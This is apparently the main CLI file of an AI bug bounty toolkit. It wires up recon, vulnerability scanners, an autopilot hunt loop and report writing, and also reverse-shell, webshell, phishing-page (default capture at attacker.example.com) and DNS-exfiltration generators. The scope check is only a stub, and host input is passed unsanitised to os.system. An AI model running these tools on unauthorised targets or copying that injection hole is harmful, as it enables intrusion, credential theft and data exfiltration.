#!/usr/bin/env python3
"""BugHunter CLI - AI bug bounty toolkit (Groq)."""
import typer, json, os, sys
from pathlib import Path
from rich.console import Console
from rich.table import Table
from core.config import HOME, GROQ_API_KEY, DEFAULT_MODEL
from core.memory import recon_dir, scan_dir, LeadBoard

app = typer.Typer(help="BugHunter - AI bug bounty toolkit")
console = Console()

def _target(t):
    return t.replace("https://", "").replace("http://", "").split("/")[0]

@app.command()
def setup(provider: str = typer.Option(None, "--provider"), model: str = typer.Option(None, "--model")):
    """Configure AI provider (Groq)."""
    if provider:
        os.environ["BUGHUNTER_PROVIDER"] = provider
    if model:
        os.environ["BUGHUNTER_MODEL"] = model
    console.print(f"[green]Provider:[/green] groq")
    console.print(f"[green]Model:[/green] {model or DEFAULT_MODEL}")
    console.print(f"[yellow]Set GROQ_API_KEY env var. Current: {'set' if GROQ_API_KEY else 'NOT SET'}[/yellow]")
    console.print(f"Home: {HOME}")

@app.command()
def providers():
    console.print("groq (default) - set GROQ_API_KEY")

@app.command()
def models():
    console.print(f"Default: {DEFAULT_MODEL}")
    console.print("Fast: llama-3.1-8b-instant")

@app.command()
def status():
    console.print(f"Home: {HOME}")
    console.print(f"GROQ_API_KEY: {'set' if GROQ_API_KEY else 'NOT SET'}")
    console.print(f"Model: {DEFAULT_MODEL}")

@app.command()
def recon(target: str):
    """Full recon pipeline."""
    from agents.recon_agent import run as recon_run
    domain = _target(target)
    console.print(f"[bold]Recon on {domain}[/bold]")
    r = recon_run(domain)
    console.print(f"Subdomains: {len(r['subdomains'])}")
    console.print(f"Live hosts: {len(r['hosts'])}")
    t = Table(title="Live Hosts")
    t.add_column("URL"); t.add_column("Status"); t.add_column("Title"); t.add_column("Tech")
    for h in r["hosts"][:30]:
        t.add_row(h["url"], str(h["status"]), h.get("title","")[:40], ",".join(h.get("tech",[])))
    console.print(t)

@app.command()
def hunt(target: str, username: str = typer.Option(None, "--username"), password: str = typer.Option(None, "--password"), login_url: str = typer.Option(None, "--login-url")):
    """Hunt for vulnerabilities (assumes recon done)."""
    from agents.recon_agent import run as recon_run
    from agents.hunter import run as hunt_run
    domain = _target(target)
    from core.config import AUTH_USERNAME, AUTH_PASSWORD, AUTH_LOGIN_URL, AUTH_USER_FIELD, AUTH_PASS_FIELD
    u = username or AUTH_USERNAME; pw = password or AUTH_PASSWORD; lu = login_url or AUTH_LOGIN_URL
    if u and pw:
        from core.auth import Session, set_current
        sess = Session()
        if not lu:
            lu = "http://{}/login".format(domain) if ":" in domain else "https://{}/login".format(domain)
        ok = sess.login_form(lu, u, pw, AUTH_USER_FIELD, AUTH_PASS_FIELD)
        if not ok: ok = sess.login_json(lu, u, pw, AUTH_USER_FIELD, AUTH_PASS_FIELD)
        if ok:
            set_current(sess)
            console.print("[green]Authenticated[/green]")
    recon = recon_run(domain)
    findings = hunt_run(recon)
    from core.auth import clear_current
    clear_current()
    _print_findings(findings)
    return findings

@app.command()
def autopilot(target: str, normal: bool = typer.Option(True, "--normal"), username: str = typer.Option(None, "--username"), password: str = typer.Option(None, "--password"), login_url: str = typer.Option(None, "--login-url")):
    """Autonomous hunt loop: recon -> hunt -> validate -> report."""
    from agents.autopilot import run as auto_run
    domain = _target(target)
    res = auto_run(domain, username=username, password=password, login_url=login_url)
    console.print(f"[bold green]Done. Valid findings: {len(res['valid'])}, gated: {len(res['gated'])}[/bold green]")

@app.command()
def validate(finding: str = typer.Option(None, "--finding")):
    """Run 7-Question Gate on current finding."""
    from core.findings import Finding
    from agents.validator import validate_finding, seven_question_gate
    # load last findings
    domain = None
    # try to find latest scan dir
    scans = sorted(Path(HOME/"scans").iterdir()) if (HOME/"scans").exists() else []
    if not scans:
        console.print("No scans found. Run hunt first.")
        return
    latest = scans[-1]
    fpath = latest / "findings_raw.json"
    if not fpath.exists():
        console.print("No findings_raw.json")
        return
    data = json.loads(fpath.read_text())
    if not data:
        console.print("No findings.")
        return
    # validate all
    from core.findings import Finding
    findings = [Finding(**{k: v for k, v in d.items() if k in Finding.__dataclass_fields__}) for d in data]
    for f in findings:
        ok, reason = validate_finding(f)
        gate = seven_question_gate(f)
        score = sum(1 for v in gate.values() if v)
        console.print(f"[{'green' if ok else 'red'}]{f.type} @ {f.url}[/] valid={ok} score={score}/7  {reason}")
    # save validated
    valid = [f for f in findings if f.verified and not f.false_positive]
    (latest / "findings_validated.json").write_text(json.dumps([f.to_dict() for f in valid], indent=2, default=str))

@app.command()
def report():
    """Write submission-ready report from last validated findings."""
    from agents.reporter import run as report_run
    scans = sorted(Path(HOME/"scans").iterdir()) if (HOME/"scans").exists() else []
    if not scans:
        console.print("No scans found.")
        return
    latest = scans[-1]
    vpath = latest / "findings_validated.json"
    if vpath.exists():
        data = json.loads(vpath.read_text())
    else:
        data = json.loads((latest / "findings_raw.json").read_text()) if (latest/"findings_raw.json").exists() else []
    from core.findings import Finding
    findings = [Finding(**{k: v for k, v in d.items() if k in Finding.__dataclass_fields__}) for d in data]
    domain = latest.name
    path = report_run(domain, findings)
    console.print(f"Report: {path}")

@app.command()
def surface(target: str):
    """Ranked attack surface from recon data."""
    domain = _target(target)
    rd = recon_dir(domain)
    if not (rd / "live_hosts.json").exists():
        console.print("Run recon first.")
        return
    hosts = json.loads((rd / "live_hosts.json").read_text())
    # rank by interestingness
    def score(h):
        s = 0
        t = " ".join(h.get("tech", [])).lower()
        if any(x in t for x in ["php", "wordpress", "laravel", "django"]): s += 3
        if any(x in h.get("url","") for x in ["api", "admin", "dev", "staging", "test"]): s += 3
        if h.get("status") in (200, 301, 302): s += 1
        return s
    hosts_sorted = sorted(hosts, key=score, reverse=True)
    t = Table(title="Attack Surface")
    t.add_column("Score"); t.add_column("URL"); t.add_column("Tech"); t.add_column("Title")
    for h in hosts_sorted[:40]:
        t.add_row(str(score(h)), h["url"], ",".join(h.get("tech",[])), h.get("title","")[:40])
    console.print(t)

@app.command()
def scope(asset: str):
    """Verify asset is in scope (basic)."""
    console.print(f"Asset: {asset}")
    console.print("Manual scope verification required; check program policy.")

@app.command(name="scope-aggregate")
def scope_aggregate(program: str):
    console.print(f"Aggregate scope for {program} - integrate H1/Bugcrowd APIs (not implemented offline).")

@app.command()
def triage():
    """Quick 7-Question Gate on last findings."""
    validate()

@app.command(name="web3-audit")
def web3_audit(contract: str):
    console.print("Web3 audit: provide contract file; basic checks only.")
    p = Path(contract)
    if not p.exists():
        console.print("File not found.")
        return
    code = p.read_text()
    issues = []
    if "tx.origin" in code: issues.append("tx.origin used for auth")
    if ".call{" in code or ".call(" in code: issues.append("low-level call; check reentrancy")
    if "delegatecall" in code: issues.append("delegatecall; check storage collision")
    if "selfdestruct" in code: issues.append("selfdestruct present")
    for i in issues:
        console.print(f"- {i}")

@app.command(name="graphql-audit")
def graphql_audit(url: str):
    from scan.graphql import scan_base
    findings = scan_base(url)
    _print_findings(findings)

@app.command(name="param-discover")
def param_discover(url: str):
    """Find hidden HTTP parameters (Arjun-like heuristic)."""
    from core.http import get
    import itertools
    common = ["id","user","page","q","search","debug","admin","test","file","path","url","redirect","next","token","key","secret","callback","action","method","format","lang","locale","sort","order","limit","offset","filter","query","name","email","password","username","role","type","mode","view","do","cmd","exec","include","template","data","value","input","msg","message","text","content","title","desc","description","comment","note","ref","source","target","dest","destination","to","from","subject","body","content","payload","json","xml","html","css","js","script","code","func","function","handler","process","run","execute","eval","load","read","write","save","delete","remove","update","create","add","edit","modify","set","get","post","put","patch","options","head","trace","connect"]
    parsed = __import__("urllib.parse", fromlist=["urlparse"]).urlparse(url)
    found = []
    baseline = get(url)
    base_len = len(baseline.text or "")
    for p in common:
        r = get(url, params={p: "FUZZ123"})
        if r.status != baseline.status and r.status not in (0,):
            found.append((p, r.status))
        elif r.status == baseline.status and abs(len(r.text or "") - base_len) > 50:
            found.append((p, "len-diff"))
    console.print("Candidate params:")
    for p, info in found:
        console.print(f"  {p}: {info}")

@app.command(name="bypass-403")
def bypass_403(url: str):
    from core.http import get, request
    headers_list = [
        {"X-Original-URL": url},
        {"X-Rewrite-URL": "/"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]
    methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]
    paths = [url, url + "/", url + "/.", url + "%2f", url + "?", url + "#"]
    console.print(f"Baseline: {get(url).status}")
    for m in methods:
        r = request(m, url)
        if r.status not in (403, 401, 404, 0):
            console.print(f"[green]Method {m} -> {r.status}[/green]")
    for h in headers_list:
        r = get(url, headers=h)
        if r.status not in (403, 401, 404, 0):
            console.print(f"[green]Headers {h} -> {r.status}[/green]")
    for p in paths:
        r = get(p)
        if r.status not in (403, 401, 404, 0):
            console.print(f"[green]Path {p} -> {r.status}[/green]")

@app.command(name="secrets-hunt")
def secrets_hunt(js_bundle: str = typer.Option(None, "--js-bundle")):
    """Scan JS bundle dir or file for secrets."""
    from core.http import get
    import re, pathlib
    patterns = {
        "aws_key": r"AKIA[0-9A-Z]{16}",
        "generic_secret": r"(?i)(secret|password|passwd|pwd|token|api[_-]?key)\s*[:=]\s*['\"][^'\"]{8,}['\"]",
        "jwt": r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*",
        "private_key": r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----",
        "google_api": r"AIza[0-9A-Za-z_-]{35}",
        "github_token": r"gh[pousr]_[A-Za-z0-9]{36,}",
        "slack_token": r"xox[baprs]-[0-9A-Za-z-]{10,}",
    }
    targets = []
    if js_bundle and pathlib.Path(js_bundle).is_dir():
        for p in pathlib.Path(js_bundle).rglob("*"):
            if p.is_file():
                targets.append(p)
    elif js_bundle and pathlib.Path(js_bundle).is_file():
        targets.append(pathlib.Path(js_bundle))
    else:
        console.print("Provide --js-bundle <dir|file>")
        return
    for p in targets[:50]:
        try:
            text = p.read_text(errors="ignore")
        except Exception:
            continue
        for name, pat in patterns.items():
            for m in re.finditer(pat, text):
                console.print(f"[red]{name}[/red] in {p}: {m.group(0)[:80]}")

@app.command(name="takeover")
def takeover(recon: str = typer.Option(None, "--recon")):
    from scan.takeover import scan_hosts
    from core.memory import recon_dir
    import json
    domain = _target(recon) if recon else None
    hosts = []
    if recon and (recon_dir(recon.replace("https://","").replace("http://","").split("/")[0]) / "live_hosts.json").exists():
        d = recon_dir(recon.replace("https://","").replace("http://","").split("/")[0])
        hosts = [h["host"] for h in json.loads((d/"live_hosts.json").read_text())]
    else:
        hosts = [recon] if recon else []
    findings = scan_hosts(hosts)
    _print_findings(findings)

@app.command(name="cloud-recon")
def cloud_recon(keyword: str = typer.Option(None, "--keyword")):
    """Basic cloud asset discovery (S3/Azure/GCP naming)."""
    import itertools
    if not keyword:
        console.print("Provide --keyword <name>")
        return
    suffixes = ["", "-dev", "-staging", "-prod", "-backup", "-assets", "-static", "-data", "-logs"]
    providers = {
        "s3": "https://{b}.s3.amazonaws.com",
        "azure": "https://{b}.blob.core.windows.net",
        "gcp": "https://storage.googleapis.com/{b}",
    }
    for prov, tmpl in providers.items():
        for suf in suffixes:
            b = f"{keyword}{suf}"
            url = tmpl.format(b=b)
            from core.http import get
            r = get(url)
            if r.status not in (404, 0):
                console.print(f"[green]{prov}[/green] {url} -> {r.status}")

@app.command(name="scan-cves")
def scan_cves(host: str):
    """Focused CVE sweep via nuclei if installed, else basic checks."""
    import shutil
    if shutil.which("nuclei"):
        os.system(f"nuclei -u {host} -severity high,critical -silent")
    else:
        console.print("nuclei not installed; running basic header/CVE hints.")
        from core.http import get
        r = get(host if host.startswith("http") else f"https://{host}")
        console.print(f"Status {r.status}; Server: {r.headers.get('server')}")

@app.command(name="token-scan")
def token_scan(contract: str):
    web3_audit(contract)

@app.command(name="chains")
def chains_cmd():
    """Build exploit chains from last validated findings."""
    from chains.builder import build_chains
    import json
    scans = sorted(Path(HOME/"scans").iterdir()) if (HOME/"scans").exists() else []
    if not scans:
        console.print("No scans found.")
        return
    latest = scans[-1]
    vpath = latest / "findings_validated.json"
    data = json.loads(vpath.read_text()) if vpath.exists() else []
    from core.findings import Finding
    findings = [Finding(**{k: v for k, v in d.items() if k in Finding.__dataclass_fields__}) for d in data]
    domain = latest.name
    chains = build_chains(findings, domain)
    console.print(f"Chains: {len(chains)}")
    for c in chains:
        console.print(f"- {c.get('name')} [{c.get('severity')}]")
        for st in c.get("steps", []):
            console.print(f"    -> {st}")
        console.print(f"    Impact: {c.get('impact')}")

@app.command(name="fuzz")
def fuzz_cmd(url: str):
    """Fuzz a URL for zero-day candidates."""
    from fuzz.engine import fuzz_url, differential_scan
    findings = fuzz_url(url) + differential_scan(url)
    _print_findings(findings)

@app.command(name="zero-day")
def zero_day(target: str):
    """Zero-day discovery mode: recon + hunt + fuzz + chains."""
    from agents.autopilot import run as auto_run
    res = auto_run(target)
    # extra fuzz on all crawled urls
    from core.memory import recon_dir
    import json
    domain = target.replace("https://","").replace("http://","").split("/")[0]
    rd = recon_dir(domain)
    crawled = json.loads((rd/"crawl.json").read_text()) if (rd/"crawl.json").exists() else {}
    from fuzz.engine import fuzz_url
    extra = []
    for u, c in crawled.items():
        if isinstance(c, dict) and "error" not in c:
            for p in c.get("pages", [])[:20]:
                extra.extend(fuzz_url(p))
    console.print(f"Extra fuzz findings: {len(extra)}")

@app.command(name="ai-audit")
def ai_audit(url: str):
    """Audit an AI/LLM application endpoint for prompt injection, jailbreak, leakage."""
    from scan.ai_llm import scan_url, scan_base
    findings = scan_base(url)
    _print_findings(findings)

@app.command(name="waf-scan")
def waf_scan_cmd(url: str):
    from scan.waf import scan_url
    _print_findings(scan_url(url))

@app.command(name="hijack")
def hijack_cmd(url: str):
    from scan.hijack import scan_url
    _print_findings(scan_url(url))

@app.command(name="upload-test")
def upload_test(url: str):
    from scan.upload import scan_url
    _print_findings(scan_url(url))

@app.command(name="mitb")
def mitb_cmd(url: str):
    from scan.mitb import scan_url
    _print_findings(scan_url(url))

@app.command(name="xss-adv")
def xss_adv_cmd(url: str):
    from scan.xss_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="inj-adv")
def inj_adv_cmd(url: str):
    from scan.injection_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="ssrf-adv")
def ssrf_adv_cmd(url: str):
    from scan.ssrf_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="csrf")
def csrf_cmd(url: str):
    from scan.csrf import scan_url
    _print_findings(scan_url(url))

@app.command(name="cache-deception")
def cache_dec_cmd(url: str):
    from scan.cache_deception import scan_url
    _print_findings(scan_url(url))

@app.command(name="default-creds")
def default_creds_cmd(url: str):
    from scan.default_creds import scan_base
    _print_findings(scan_base(url))

@app.command(name="ratelimit")
def ratelimit_cmd(url: str):
    from scan.ratelimit import scan_url
    _print_findings(scan_url(url))

@app.command(name="saml")
def saml_cmd(url: str):
    from scan.saml import scan_url
    _print_findings(scan_url(url))

@app.command(name="dirbust")
def dirbust_cmd(url: str):
    from recon.dirbust import brute
    res = brute(url)
    for r in res:
        console.print(f"{r['status']} {r['url']} ({r['length']} bytes)")

@app.command(name="wayback")
def wayback_cmd(domain: str):
    from recon.wayback import fetch_urls
    urls = fetch_urls(domain)
    console.print(f"Found {len(urls)} archived URLs")
    for u in urls[:50]:
        console.print(u)

@app.command(name="patterns")
def patterns_cmd():
    from memory.pattern_db import top_patterns
    for t, c in top_patterns():
        console.print(f"{c}  {t}")

@app.command(name="polyglot")
def polyglot_cmd(url: str):
    from scan.file_polyglot import scan_url
    _print_findings(scan_url(url))

@app.command(name="img-meta")
def imgmeta_cmd(url: str):
    from scan.img_metadata import scan_url
    _print_findings(scan_url(url))

@app.command(name="archive")
def archive_cmd(url: str):
    from scan.archive_attacks import scan_url
    _print_findings(scan_url(url))

@app.command(name="xml-adv")
def xmladv_cmd(url: str):
    from scan.xml_attacks import scan_url
    _print_findings(scan_url(url))

@app.command(name="http2")
def http2_cmd(url: str):
    from scan.http2 import scan_url
    _print_findings(scan_url(url))

@app.command(name="cswsh")
def cswsh_cmd(url: str):
    from scan.cswsh import scan_url
    _print_findings(scan_url(url))

@app.command(name="gql-deep")
def gqldeep_cmd(url: str):
    from scan.graphql_deep import scan_url
    _print_findings(scan_url(url))

@app.command(name="email-inj")
def emailinj_cmd(url: str):
    from scan.email_injection import scan_url
    _print_findings(scan_url(url))

@app.command(name="db-exposure")
def dbexp_cmd(url: str):
    from scan.db_exposure import scan_base
    _print_findings(scan_base(url))

@app.command(name="containers")
def containers_cmd(url: str):
    from scan.container import scan_base
    _print_findings(scan_base(url))

@app.command(name="tls")
def tls_cmd(url: str):
    from scan.tls_audit import scan_url
    _print_findings(scan_url(url))

@app.command(name="bizlogic")
def bizlogic_cmd(url: str):
    from scan.business_logic import scan_url
    _print_findings(scan_url(url))

@app.command(name="api-disc")
def apidisc_cmd(url: str):
    from scan.api_discovery import scan_base
    _print_findings(scan_base(url))

@app.command(name="saml-xsw")
def samlxsw_cmd(url: str):
    from scan.saml_xsw import scan_url
    _print_findings(scan_url(url))

@app.command(name="soap")
def soap_cmd(url: str):
    from scan.soap import scan_url
    _print_findings(scan_url(url))

@app.command(name="grpc")
def grpc_cmd(url: str):
    from scan.grpc import scan_base
    _print_findings(scan_base(url))

@app.command(name="mfa")
def mfa_cmd(url: str):
    from scan.mfa_bypass import scan_base
    _print_findings(scan_base(url))

@app.command(name="oauth-adv")
def oauthadv_cmd(url: str):
    from scan.oauth_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="port-scan")
def portscan_cmd(url: str):
    from scan.port_scan import scan_base
    _print_findings(scan_base(url))

@app.command(name="http3")
def http3_cmd(url: str):
    from scan.http3 import scan_url
    _print_findings(scan_url(url))

@app.command(name="sw")
def sw_cmd(url: str):
    from scan.service_worker import scan_url
    _print_findings(scan_url(url))

@app.command(name="webrtc")
def webrtc_cmd(url: str):
    from scan.webrtc import scan_url
    _print_findings(scan_url(url))

@app.command(name="rfi")
def rfi_cmd(url: str):
    from scan.rfi import scan_url
    _print_findings(scan_url(url))

@app.command(name="lfi-adv")
def lfiadv_cmd(url: str):
    from scan.lfi_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="cmdi-adv")
def cmdiadv_cmd(url: str):
    from scan.cmdi_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="nosql-adv")
def nosqladv_cmd(url: str):
    from scan.nosql_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="pp-adv")
def ppadv_cmd(url: str):
    from scan.prototype_pollution_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="cors-adv")
def corsadv_cmd(url: str):
    from scan.cors_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="csp-adv")
def cspadv_cmd(url: str):
    from scan.csp_bypass_advanced import scan_url
    _print_findings(scan_url(url))

@app.command(name="scope-check")
def scope_check_cmd(asset: str, program: str = typer.Option(None, "--program")):
    from core.scope import verify
    ok, msg = verify(asset, program)
    console.print(f"[{'green' if ok else 'red'}]{asset}: {msg}[/]")

@app.command(name="dup-check")
def dup_check_cmd(target: str, vuln_type: str):
    from agents.duplicate_checker import check_local, check_hacktivity
    local_dup, msg1 = check_local(target, vuln_type)
    console.print(f"Local: {msg1}")
    remote_dup, msg2 = check_hacktivity(target, vuln_type, "")
    console.print(f"Remote: {msg2}")

@app.command(name="poc")
def poc_cmd():
    from core.findings import Finding
    from agents.poc_generator import generate_poc
    import json
    scans = sorted(Path(HOME/"scans").iterdir()) if (HOME/"scans").exists() else []
    if not scans:
        console.print("No scans.")
        return
    latest = scans[-1]
    vpath = latest / "findings_validated.json"
    data = json.loads(vpath.read_text()) if vpath.exists() else []
    if not data:
        console.print("No validated findings.")
        return
    f = Finding(**{k: v for k, v in data[0].items() if k in Finding.__dataclass_fields__})
    poc = generate_poc(f, latest.name)
    console.print(poc)

@app.command(name="triage-prep")
def triage_prep_cmd():
    from core.findings import Finding
    from agents.triage import prepare_triage, check_never_submit
    import json
    scans = sorted(Path(HOME/"scans").iterdir()) if (HOME/"scans").exists() else []
    if not scans:
        console.print("No scans.")
        return
    latest = scans[-1]
    vpath = latest / "findings_validated.json"
    data = json.loads(vpath.read_text()) if vpath.exists() else []
    for d in data[:5]:
        f = Finding(**{k: v for k, v in d.items() if k in Finding.__dataclass_fields__})
        ns, reason = check_never_submit(f)
        console.print(f"[{'red' if ns else 'green'}]{f.type}: {reason}[/]")
        if not ns:
            res = prepare_triage(f, latest.name)
            if res:
                console.print(f"  Verdict: {res.get('likely_verdict')}")
                for q in res.get("questions", [])[:3]:
                    console.print(f"  Q: {q}")

@app.command(name="auth-scan")
def auth_scan_cmd(url: str, user: str, password: str):
    from core.auth import Session
    s = Session()
    ok = s.login_form(url, user, password)
    console.print(f"Login: {'success' if ok else 'failed'}")
    if ok:
        console.print(f"Cookies: {s.cookies}")
        console.print(f"Token: {s.token}")

@app.command(name="revshell")
def revshell_cmd(shell_type: str = typer.Option("bash", "--type"), host: str = typer.Option("127.0.0.1", "--host"), port: int = typer.Option(4444, "--port")):
    from exploit.reverse_shell import generate, list_shells
    if shell_type == "list":
        console.print(list_shells())
        return
    p = generate(shell_type, host, port)
    if p:
        console.print(p)
    else:
        console.print("Unknown shell type. Use --type list")

@app.command(name="webshell")
def webshell_cmd(shell_type: str = typer.Option("php_simple", "--type")):
    from exploit.webshell import generate, list_shells
    if shell_type == "list":
        console.print(list_shells())
        return
    p = generate(shell_type)
    if p:
        console.print(p)

@app.command(name="phish")
def phish_cmd(template: str = typer.Option("login", "--template"), action: str = typer.Option("http://attacker.example.com/capture", "--action")):
    from redteam.phishing import generate
    console.print(generate(template, action))

@app.command(name="js-analyze")
def jsanalyze_cmd(url: str):
    from recon.advanced.js_analysis import analyze_js, scan_page
    if url.endswith(".js"):
        res = analyze_js(url)
        console.print(f"Endpoints: {len(res['endpoints'])}")
        for e in res["endpoints"][:30]:
            console.print(f"  {e}")
        console.print(f"Secrets: {len(res['secrets'])}")
        for sec in res["secrets"]:
            console.print(f"  [{sec['type']}] {sec['value']}")
        console.print(f"Source maps: {res['sourcemaps']}")
    else:
        res = scan_page(url)
        console.print(f"Scripts found: {len(res)}")
        for r in res:
            a = r["analysis"]
            console.print(f"  {r['script']}: {len(a['endpoints'])} endpoints, {len(a['secrets'])} secrets")

@app.command(name="det-stub")
def det_stub_cmd():
    """Run deterministic stub mode (no LLM required)."""
    console.print("Deterministic stub available. Use bugsBounty autopilot without GROQ_API_KEY.")

@app.command(name="osint")
def osint_cmd(domain: str):
    from osint.employees import harvest_emails, github_recon
    emails = harvest_emails(domain)
    console.print(f"Emails: {len(emails)}")
    for e in emails:
        console.print(f"  {e}")
    gh = github_recon(domain.split('.')[0])
    console.print(f"GitHub findings: {len(gh)}")
    for g in gh:
        console.print(f"  {g}")

@app.command(name="aws-deep")
def awsdeep_cmd(url: str):
    from cloud.aws_deep import scan_base
    _print_findings(scan_base(url))

@app.command(name="cicd")
def cicd_cmd(url: str):
    from cicd.github_actions import scan_repo
    _print_findings(scan_repo(url))

@app.command(name="templates")
def templates_cmd(target: str, template_dir: str = typer.Option("templates", "--dir")):
    from templates.engine import run_dir
    findings = run_dir(template_dir, target)
    _print_findings(findings)

@app.command(name="exfil")
def exfil_cmd(data: str, domain: str):
    from exfil.dns_exfil import dns_exfil
    cmds = dns_exfil(data, domain)
    for c in cmds:
        console.print(c)

@app.command(name="chat")
def chat():
    """Interactive AI hunting shell."""
    from core.llm import get_llm
    llm = get_llm()
    console.print("Chat mode. Type 'exit' to quit.")
    history = []
    while True:
        try:
            q = input("you> ")
        except EOFError:
            break
        if q.strip().lower() in ("exit", "quit"):
            break
        history.append({"role": "user", "content": q})
        try:
            ans = llm.chat(history)
            console.print(f"ai> {ans}")
            history.append({"role": "assistant", "content": ans or ""})
        except Exception as e:
            console.print(f"error: {e}")

@app.command(name="memory-gc")
def memory_gc(rotate: bool = typer.Option(False, "--rotate")):
    console.print("Memory GC: no-op in this build.")

def _print_findings(findings):
    from rich.table import Table
    t = Table(title=f"Findings ({len(findings)})")
    t.add_column("Sev"); t.add_column("Type"); t.add_column("URL"); t.add_column("Param"); t.add_column("Conf")
    for f in findings:
        t.add_row(f.severity, f.type, f.url[:60], f.parameter, str(f.confidence))
    console.print(t)

if __name__ == "__main__":
    app()
